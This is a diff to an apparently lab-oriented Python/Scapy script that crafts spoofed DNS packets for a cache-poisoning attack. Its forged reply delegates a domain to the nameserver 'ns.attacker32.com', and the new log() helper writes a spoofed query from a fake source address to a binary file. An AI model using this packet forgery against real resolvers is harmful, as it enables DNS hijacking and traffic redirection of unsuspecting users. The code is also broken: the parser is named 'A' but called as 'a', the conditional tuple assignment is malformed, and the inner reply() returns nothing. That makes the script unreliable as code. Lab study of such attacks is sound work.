@@ -24,16 +24,34 @@ def reply():
               ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
     return ip/udp/dns
 
+def log(type='q'):
+    def query():
+        ip = IP(dst='10.9.0.53', src='1.2.3.4')
+        udp = UDP(dport=53, sport=12345, chksum=0)
+        dns = DNS(id=0xAAAA, qr=0,
+                  nscount=0, ancount=0, arcount=0,
+                  qdcount=1, qd=DNSQR(qname='twysw.example.com'))
+        return ip/udp/dns
+
+    def reply():
+        pass
+
+    filename, packet = 'ip.req.bin', query() if type == 'q' else\
+                       'ip.resp.bin', reply()
+    with open(filename, 'wb') as f:
+        f.write(bytes(packet))
+
 
 if __name__ == '__main__':
     A = ArgumentParser()
     a.add_argument('-q', '--query', help='DNS query')
     a.add_argument('-r', '--reply', help='DNS reply')
+    a.add_argument('-l', '--log', help='Log DNS packets')
     args = A.parse_args()
 
     packet = None
     packet = query() if args.query else packet
     packet = reply() if args.reply else packet
-    assert payload, 'DNS packet type not specified'
+    assert packet, 'DNS packet type not specified'
 
     send(packet, verbose=0)
